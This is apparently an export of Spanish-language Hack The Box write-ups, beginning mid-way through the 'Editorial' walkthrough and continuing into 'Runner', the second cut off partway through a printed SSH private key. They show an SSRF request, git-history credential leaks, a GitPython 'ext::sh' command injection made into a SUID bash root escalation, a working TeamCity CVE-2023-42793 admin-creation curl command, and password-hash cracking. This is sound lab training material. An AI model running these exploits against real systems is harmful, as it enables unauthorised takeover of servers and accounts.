\"http://editorial.htb/static/uploads/d378012d-9008-4f49-a460-a8b4c106e7f9\"&lt;!doctype html&gt;&lt;html lang=en&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;si te sale este error volve a enviar la peticion desde burp… como dije antes la url se refresca o reinicia.. deben haber tareas crontab por detras que hacen que la maquina se reinicie… en fin esto es HTB…tenemos que ser rapidos.. yyyy pudimos llegar y ver las apis o enpointscurl -s -X GET \"http://editorial.htb/static/uploads/26c234bf-53fe-4689-84be-c245ba0bbf18\" | jq{  \"messages\": [    {      \"promotions\": {        \"description\": \"Retrieve a list of all the promotions in our library.\",        \"endpoint\": \"/api/latest/metadata/messages/promos\",        \"methods\": \"GET\"      }    },    {      \"coupons\": {        \"description\": \"Retrieve the list of coupons to use in our library.\",        \"endpoint\": \"/api/latest/metadata/messages/coupons\",        \"methods\": \"GET\"      }    },    {      \"new_authors\": {        \"description\": \"Retrieve the welcome message sended to our new authors.\",        \"endpoint\": \"/api/latest/metadata/messages/authors\",        \"methods\": \"GET\"      }    },    {      \"platform_use\": {        \"description\": \"Retrieve examples of how to use the platform.\",        \"endpoint\": \"/api/latest/metadata/messages/how_to_use_platform\",        \"methods\": \"GET\"      }    }  ],  \"version\": [    {      \"changelog\": {        \"description\": \"Retrieve a list of all the versions and updates of the api.\",        \"endpoint\": \"/api/latest/metadata/changelog\",        \"methods\": \"GET\"      }    },    {      \"latest\": {        \"description\": \"Retrieve the last version of api.\",        \"endpoint\": \"/api/latest/metadata\",        \"methods\": \"GET\"      }    }  ]}En burpsuite vamos a poner el endpoint que queremos ver, en mi caso quiero enumerar por usuarios o informacion de los administradores de la web, asi que lo que mas se acerca a tener esta info es este enpoint /api/latest/metadata/messages/authorsPOST /upload-cover HTTP/1.1Host: editorial.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: multipart/form-data; boundary=---------------------------65112106330445755751282750520Content-Length: 398Origin: http://editorial.htbConnection: keep-aliveReferer: http://editorial.htb/upload-----------------------------65112106330445755751282750520Content-Disposition: form-data; name=\"bookurl\"http://127.0.0.1:5000/api/latest/metadata/messages/authors-----------------------------65112106330445755751282750520Content-Disposition: form-data; name=\"bookfile\"; filename=\"\"Content-Type: application/octet-stream-----------------------------65112106330445755751282750520--Podemos lograr visualizar un usuario y contraseña, el impacto de esta vulnerabilidad es critico. Se puede llegar a filtrar, datos sensibles o apis internas que estan en desarrollo aun…ssh dev@10.10.11.20Password: Escalada de PrivilegiosShell DevVamos a entrar a la carpeta apps, que es donde esta todo el proyecto de la aplicacion web, cuando entramos nos encontramos con un .git… si hacemos un git log vamos a ver todos los cambios que se realizo en le proyecto, a mi me llama la atencion uno de ellosdev@editorial:~/apps$ ls -latotal 12drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .drwxr-x--- 4 dev dev 4096 Oct 29 18:40 ..drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .gitdev@editorial:~/apps$ git logcommit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;Date:   Sun Apr 30 21:04:21 2023 -0500    fix: bugfix in api port endpointcommit dfef9f20e57d730b7d71967582035925d57ad883Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;Date:   Sun Apr 30 21:01:11 2023 -0500    change: remove debug and update api portcommit b73481bb823d2dfb49c44f4c1e6a7e11912ed8aeAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;Date:   Sun Apr 30 20:55:08 2023 -0500    change(api): downgrading prod to dev        * To use development environment.commit 1e84a036b2f33c59e2390730699a488c65643d28Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;Date:   Sun Apr 30 20:51:10 2023 -0500    feat: create api to editorial info        * It (will) contains internal info about the editorial, this enable       faster access to information.commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;Date:   Sun Apr 30 20:48:43 2023 -0500    feat: create editorial appchange(api): downgrading prod to dev esto parece raro, ya que nosotros encontramos las credenciales del usuario dev en una api, puede que anteriormente haya existido otro usuario y contraseña expuestaAsi que con git show vamos a ver en profundidad todo lo que se cambio, solo hay que pasarle este commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8aedev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8aecommit b73481bb823d2dfb49c44f4c1e6a7e11912ed8aeAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;Date:   Sun Apr 30 20:55:08 2023 -0500    change(api): downgrading prod to dev        * To use development environment.diff --git a/app_api/app.py b/app_api/app.pyindex 61b786f..3373b14 100644--- a/app_api/app.py+++ b/app_api/app.py@@ -64,7 +64,7 @@ def index(): @app.route(api_route + '/authors/message', methods=['GET']) def api_mail_new_authors():     return jsonify({-        'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: 080217_Producti0n_2023!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\"+        'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\"     }) # TODO: replace dev credentials when checks pass  # -------------------------------Estas credenciales se cambiaron por las de el usuario DEVprod Password: 080217_Producti0n_2023!@Shell ProdConseguimos convertirnos en el usuario prodVamos a enumerar si contamos con permisos SUDO para ejecutar algun binario o script del sistemaprod@editorial:/home/dev/apps$ sudo -l[sudo] password for prod: Matching Defaults entries for prod on editorial:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser prod may run the following commands on editorial:    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *SUDOPodemos ejecutar como el usuario root este script de pythonprod@editorial:/home/dev/apps$ ls -l /opt/internal_apps/clone_changes/clone_prod_change.py-rwxr-x--- 1 root prod 256 Jun  4 11:30 /opt/internal_apps/clone_changes/clone_prod_change.pyTenemos permisos de lectura pero no de escrituraprod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py#!/usr/bin/python3import osimport sysfrom git import Repoos.chdir('/opt/internal_apps/clone_changes')url_to_clone = sys.argv[1]r = Repo.init('', bare=True)r.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])El script no es muy complejo, al parecer se ubica en /opt/internal_apps/clone_changes ahí es donde hace toda su ejecución. Toma un parámetro y lo guarda en una variable llamada url_to_clone, lo siguiente que hace es iniciar un repositorio y clonar los cambios alojados en la URL que le pasamos, sobre la carpeta new_changes.Tambien notamos que hace un from git import Repo me parece que es una vulnerabilidad que salio por alla en el 2022, vamos a investigar para salir de dudas muchachos esta informacion te puede servir.prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py $(whoami)Traceback (most recent call last):  File \"/opt/internal_apps/clone_changes/clone_prod_change.py\", line 12, in &lt;module&gt;    r.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])  File \"/usr/local/lib/python3.10/dist-packages/git/repo/base.py\", line 1275, in clone_from    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)  File \"/usr/local/lib/python3.10/dist-packages/git/repo/base.py\", line 1194, in _clone    finalize_process(proc, stderr=stderr)  File \"/usr/local/lib/python3.10/dist-packages/git/util.py\", line 419, in finalize_process    proc.wait(**kwargs)  File \"/usr/local/lib/python3.10/dist-packages/git/cmd.py\", line 559, in wait    raise GitCommandError(remove_password_if_present(self.args), status, errstr)git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)  cmdline: git clone -v -c protocol.ext.allow=always prod new_changes  stderr: 'fatal: repository 'prod' does not exist'prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ';whoami'Traceback (most recent call last):  File \"/opt/internal_apps/clone_changes/clone_prod_change.py\", line 12, in &lt;module&gt;    r.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])  File \"/usr/local/lib/python3.10/dist-packages/git/repo/base.py\", line 1275, in clone_from    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)  File \"/usr/local/lib/python3.10/dist-packages/git/repo/base.py\", line 1194, in _clone    finalize_process(proc, stderr=stderr)  File \"/usr/local/lib/python3.10/dist-packages/git/util.py\", line 419, in finalize_process    proc.wait(**kwargs)  File \"/usr/local/lib/python3.10/dist-packages/git/cmd.py\", line 559, in wait    raise GitCommandError(remove_password_if_present(self.args), status, errstr)git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)  cmdline: git clone -v -c protocol.ext.allow=always ;whoami new_changes  stderr: 'fatal: repository ';whoami' does not existPrimero realizamos unas pruebas con inyecciones tipicas de Command Injection sin resultados, probamos el PoC que nos dice la vulnerabilidade de gitpython.prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'Esto va a crear un archivo llamado pwned en la carpeta /tmp.Lo hizo perfectamente como indica el PoC (Proof of Concept), creo un archivo vacio pero lo mas importante a rescatar de este archivo es que el propiertario es root, asi que estariamos ejecutando comandos como root y no como el usuario prod, vamos a cambiar el comando touch por un chmod u+s /bin/bash.Que es un permiso SUID y lo peligroso que es tener la /bin/bash con este permiso?Cuando en un binario o fichero el bit SUID está activado significa que la persona que lo ejecute va a tener los mismos permisos que la persona que lo creó. Es decir, si lo creó root tendremos permisos root. Lo peligroso es que con un simple bash -p podemos obtener una consola con los privilegios maximos."
  },
  
  {
    "title": "Runner - Hack The Box",
    "url": "/posts/runner/",
    "categories": "htb, linux",
    "tags": "Linux, Web, API, Code, Execution, Suid, CVE, Docker, Portainer",
    "date": "2025-10-17 00:00:00 +0000",
    





    
    "snippet": "Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token A...",
    "content": "Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token API, que puede utilizarse para habilitar funciones de depuración para ejecutar comandos del sistema. Al obtener acceso a un contenedor Docker de TeamCity y comprimir los archivos de la base de datos HSQLDB, podemos extraer las credenciales del usuario matthew y encontrar una clave SSH para john. Después de descifrar la contraseña, podemos autenticarnos en el sistema de archivos del host. Al inspeccionar el archivo /etc/hosts, descubrimos una instancia de Portainer en ejecución. Utilizando las credenciales de «matthew», accedemos al subdominio desde el exterior. Una vez autenticados, descubrimos que podemos crear imágenes, pero nuestros privilegios son limitados. Después de comprobar la versión en el host, explotamos una vulnerabilidad [CVE-2024-21626] a través de la función de creación de imágenes de Portainer, lo que nos permite crear un archivo bash SUID en el hostReconocimientoNmapEn la parte inicial del reconocimiento vamos a iniciar con un escane de puertos basiconmap -p- --open -T3 -n &lt;IP&gt;  -p-          Escanear todo el rango de puertos (65535)        –open          Reportar solo los puertos abiertos        -T3          Aumentar la velocidad de escaneo, existen desde T1 a T5        -n          Anular la resolucion DNS (No hacer resolución DNS) Ya que DNS es generalmente lento, esto acelera un poco las cosas      -&gt; Puertos Abiertos-&gt; 22-&gt; 80-&gt; 8000Nmap Servicios de PuertosPosterior al escaneo de puertos vamos a identificar la version y servicio que corre en cada uno y vamos a guardarlo como archivo de documentacion portsnmap -p22,80,8000 -sCV &lt;IP&gt; -oN portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp   open  http        nginx 1.18.0 (Ubuntu)|_http-title: Runner - CI/CD Specialists|_http-server-header: nginx/1.18.0 (Ubuntu)8000/tcp open  nagios-nsca Nagios NSCA|_http-title: Site doesn't have a title (text/plain; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebLa web nos redirige a runner.htb, este seria el dominio de la paginaecho '&lt;IP&gt; runner.htb' &gt;&gt; /etc/hostsDe esta manera vamos a incorporarlo a nuestro archivo /etc/hosts donde a la hora de visitar la web nos va a resolver correctamenteComo se muestra en la imagen, esta web solo es estatica y no presenta botones con funcionalidades web como registrarse o loguearse, etc. Voy a probar buscando archivos lekeados con dirsearchEnumeracion Web Fuzzdirsearch --url http://runner.htb/ -t 50     _|. _ _  _  _  _ _|_    v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460Output File: /home/mrincreible/HTB/runner/reports/http_runner.htb/__24-10-28_14-09-52.txtTarget: http://runner.htb/[14:09:52] Starting:                                                                                                                                                       [14:10:18] 301 -  178B  - /assets  -&gt;  http://runner.htb/assets/            [14:10:18] 403 -  564B  - /assets/No encontramos nada relevante en esta parte de fuzzear por archivos o templates de la web, asi que vamos a seguir con la enumeracion de subdominios con wfuzz. Es importante tener una buena metodologia a la hora de enumerar aplicaciones web.Enumeracion Web Fuzz Domainwfuzz -c --hc=404 --hh=154 -t 100 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.runner.htb' http://runner.htb********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://runner.htb/Total requests: 100000=====================================================================ID           Response   Lines    Word       Chars       Payload     =====================================================================000013170:   401        1 L      9 W        66 Ch       \"teamcity\"Agregare este subdominio al /etc/hostsecho '&lt;IP&gt; runner.htb teamcity.runner.htb' &gt;&gt; /etc/hosts nos redirige a http://teamcity.runner.htb/login.htmlEnumeracion Web Team CityQue es TeamCity?Está diseñado para mejorar el proceso de desarrollo de software mediante la automatización de tareas rutinarias como la creación, prueba e implementación de código . TeamCity se destaca por su interfaz fácil de usar, su integración integral con sistemas de control de versiones y sus amplias capacidades de creación, prueba e implementaciónbien!!! tenemos un panel de login de esta app, tenemos que tratar de bypassear este panel. Una vez dentro imagino que habran usuarios y administradores, la version es la 2023.05.03Si realizamos una busqueda en searchsploit?Tenemos un PoC, pero nosotros vamos a leer el codigo y tratar de explotarlo de forma manual.Explotacion [CVE-2023-42793]if url.startswith(\"https://\"):    curl_command = \"curl -k\"else:    curl_command = \"curl\"get_token_url = f\"{url}/app/rest/users/id:1/tokens/RPC2\"delete_token_url = f\"{url}/app/rest/users/id:1/tokens/RPC2\"create_user_url = f\"{url}/app/rest/users\"create_user_command = \"\"token = \"\"response = requests.post(get_token_url, verify=False)En esta parte hace una validacion por si la web tiene SSL, si tiene hace un curl -K de lo contrario realiza un curl normal. Luego hace una llamada por POST a /app/rest/users/id:1/tokens/RPC2 esto te genera un token con privilegios, es ahi donde esta el fallo de TeamCity:El endpoint /app/rest/users/id:1/tokens/RPC2 se encuentra expuesto al publico sin requerir autenticacion, de aqui se puede conseguir un token de autenticacion con privilegios elevados.elif response.status_code == 404:    print(\"Token already exists\")    delete_command = f'{curl_command} -X DELETE {delete_token_url}'    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    delete_process.wait()    delete_output = delete_process.communicate()    if delete_process.returncode == 0:        print(\"Previous token deleted successfully\\nrun this command again for creating new token &amp; admin user.\")    else:        print(\"Failed to delete the previous token\")no se pueden generar 2 tokens, pero hay una manera de borrar el token actual que generamos con el Metodo curl -X DELETEif token:    headers = {        \"Authorization\": f\"Bearer {token}\",        \"Content-Type\": \"application/json\"    }    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))    username = f\"city_admin{random_chars}\"    data = {        \"username\": username,        \"password\": \"Main_password!!**\",        \"email\": \"angry-admin@funnybunny.org\",        \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}    }Luego entramos a esta parte que es la mas interesante, una vez que tengamos el token podemos crear un usuario con privilegios de la siguiente manera, en el PoC agrega las cabezeras Authorization: Bearer {token} y Content-Type: application/json, este exploit crea un usario aleatorio pasandole caracteres extraños, nosotros vamos a modificar eso. En data vamos a poner el nombre de usuario que nosotros queremos y en password lo mismo. Ya Les Muestro un Oneliner potente en CURLAntes de continuar hay que saber lo siguiente: este metodo solo nos crea un usuario con privilegios pero existe otra manera de la cual nos podemos aprovechar ejecutando comandos desde un endpoint. Esto lo vamos a ver despuescurl -s -X POST \"http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;token name=\"RPC2\" creationTime=\"2024-10-28T14:08:19.584Z\" value=\"eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2\"/&gt;en value nos sale el token que obtuvimos, este servira para el siguiente onliner. Estaria ubicandolo en Authorization: eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2curl -s -X POST \"http://teamcity.runner.htb/app/rest/users\" -H 'Authorization: {TOKEN}' -H 'Content-Type: application/json' -d '{\"email\": \"atreus@runner.htb\", \"username\": \"atreus\", \"password\": \"atreus123$!\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}'&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;user username=\"atreus\" id=\"11\" email=\"atreus@runner.htb\" href=\"/app/rest/users/id:11\"&gt;&lt;properties count=\"3\" href=\"/app/rest/users/id:11/properties\"&gt;&lt;property name=\"addTriggeredBuildToFavorites\" value=\"true\"/&gt;&lt;property name=\"plugin:vcs:anyVcs:anyVcsRoot\" value=\"atreus\"/&gt;&lt;property name=\"teamcity.server.buildNumber\" value=\"129390\"/&gt;&lt;/properties&gt;&lt;roles&gt;&lt;role roleId=\"SYSTEM_ADMIN\" scope=\"g\" href=\"/app/rest/users/id:11/roles/SYSTEM_ADMIN/g\"/&gt;&lt;/roles&gt;&lt;groups count=\"1\"&gt;&lt;group key=\"ALL_USERS_GROUP\" name=\"All Users\" href=\"/app/rest/userGroups/key:ALL_USERS_GROUP\" description=\"Contains all TeamCity users\"/&gt;&lt;/groups&gt;&lt;/user&gt;el resultado es la creacion de un usuario con privilegios de administradorIntrusion Via WebUna vez dentro de la aplicacion web podemos ir a la parte de administracion y abajo nos vamos a encontrar con una seccion de BACKUPHaciendo click en Start Backup se descargara un archivo ZIP. Una vez en tenencia del archivo vamos a descomprimirlo7z l TeamCity_Backup_20241028_142213.zip 7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024Scanning the drive for archives:1 file, 266056 bytes (260 KiB)Listing archive: TeamCity_Backup_20241028_142213.zip--Path = TeamCity_Backup_20241028_142213.zipType = zipPhysical Size = 266056Comment = TeamCity data backup; ZIP factory in use: memory-conservative (dynamic, shared); compression level -1.   Date      Time    Attr         Size   Compressed  Name------------------- ----- ------------ ------------  ------------------------2024-10-28 14:22:12 .....           92           70  version.txt2024-10-28 14:22:12 .....           45           47  metadata/metadata-version.dat2024-10-28 14:22:12 .....            6            8  charset2024-10-28 14:22:12 .....          637          310  metadata/backup.config2024-10-28 14:22:12 .....        67388        11783  metadata/schema.config2024-10-28 14:22:12 .....           50           46  database_dump/db_version2024-10-28 14:22:12 .....       112098        18694  database_dump/meta_file_line2024-10-28 14:22:12 .....           14           16  database_dump/single_row2024-10-28 14:22:12 .....           88           86  database_dump/server_property2024-10-28 14:22:12 .....          121           97  database_dump/backup_info2024-10-28 14:22:12 .....          151          123  database_dump/domain_sequence2024-10-28 14:22:12 .....          149          128  database_dump/project2024-10-28 14:22:12 .....           95           65  database_dump/vcs_root2024-10-28 14:22:12 .....           85           53  database_dump/project_mapping2024-10-28 14:22:12 .....           46           43  database_dump/vcs_root_mapping2024-10-28 14:22:12 .....           90           68  database_dump/agent_pool2024-10-28 14:22:12 .....           88           82  database_dump/usergroups2024-10-28 14:22:12 .....          428          309  database_dump/users2024-10-28 14:22:12 .....          926          326  database_dump/user_property2024-10-28 14:22:12 .....          257          136  database_dump/usergroup_notification_events2024-10-28 14:22:12 .....          373          165  database_dump/usergroup_watch_type2024-10-28 14:22:12 .....          129           83  database_dump/usergroup_notification_data2024-10-28 14:22:12 .....           53           55  database_dump/remember_me2024-10-28 14:22:12 .....          286          219  database_dump/permanent_tokens2024-10-28 14:22:12 .....           48           45  database_dump/user_projects_visibility2024-10-28 14:22:12 .....           51           49  database_dump/agent_pool_project2024-10-28 14:22:12 .....          135           93  database_dump/vcs_username2024-10-28 14:22:12 .....           42           43  database_dump/build_queue_order2024-10-28 14:22:12 .....          125           87  database_dump/user_roles2024-10-28 14:22:12 .....           71           58  database_dump/usergroup_roles2024-10-28 14:22:12 .....          370          208  database_dump/stats_publisher_state2024-10-28 14:22:12 .....          690          320  database_dump/comments2024-10-28 14:22:12 .....          346          167  database_dump/action_history2024-10-28 14:22:12 .....          766          293  database_dump/audit_additional_object2024-10-28 14:22:12 .....         1543          341  database_dump/server_statistics2024-10-28 14:22:12 .....        27042         2291  database_dump/node_tasks2024-10-28 14:22:12 .....          116          110  database_dump/node_locks2024-10-28 14:22:12 .....          163          122  database_dump/server_health_items2024-10-28 14:22:12 .....           25           24  database_dump/hidden_health_item2024-10-28 14:22:12 .....         1182          350  database_dump/config_persisting_tasks2024-10-28 14:22:12 .....           24           26  database_dump/server2024-10-28 12:47:24 .....          311          204  config/_notifications/ide_notificator/tests_unmuted.ftl.dist2024-10-28 12:46:38 .....        24199         2312  config/_logging/debug-commit-status.xml2024-10-28 12:47:24 .....          434          274  config/_notifications/ide_notificator/build_probably_hanging.ftl.distbackups de bases de datos, quizas podemos encontrar algunos hashes crackeables. Antes de seguir con eso y no volvernos locos a la hora de enumerar estas bases de datos, vamos a buscar en teamcity que usuarios validos tenemos:  Admin          John -&gt; John@runner.htb        Matthew          Matthew -&gt; Matthew@runner.htb      Usuarios validos a nivel de sistema, tenemos el puerto 22 abierto esto quiere decir que la shell tiene que venir por ese puerto.Lo siguiente sera filtrar con el comando grep por hashes para crackearlosgrep -ri \"john\"database_dump/comments:201, -42, 1709746543407, \"New username: \\'admin\\', new name: \\'John\\', new email: \\'john@runner.htb\\'\"database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1730124582065, BCRYPTgrep -ri \"matthew\"database_dump/vcs_username:2, anyVcs, -1, 0, matthewdatabase_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPTconfig/_trash/AllProjects.project1/project-config.xml:  &lt;description&gt;Matthew's projects&lt;/description&gt;config/projects/AllProjects/project-config.xml.1:  &lt;description&gt;Matthew's projects&lt;/description&gt;system/pluginData/audit/configHistory/projects/project1/config.xml.1:  &lt;description&gt;Matthew's projects&lt;/description&gt;logramos ver el hash de admin y matthew que son los usuarios a nivel de sistema o contenedor.  admin          $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye        matthew          $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em      vamos intentar crackearlos con johntheripper pasandole el diccionario rockyou.txt que es un diccionario grande y tipico en estos ataques de crackeo de contraseñas.john --show hash                                     ?:piper1231 password hash cracked, 0 leftsolo nos crackea uno, el otro hash queda ahi… vamos a intentar entrar por ssh con esta contraseña pasandole el usuario john y matthew pero no sirve para ninguno, asi que no perdamos tiempo con esto. Vamos a seguir enumerando buscando alguna id_rsafind . -name \"id_rsa\" 2&gt;/dev/null | cat ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa -----BEGIN OPENSSH PRIVATE KEY-----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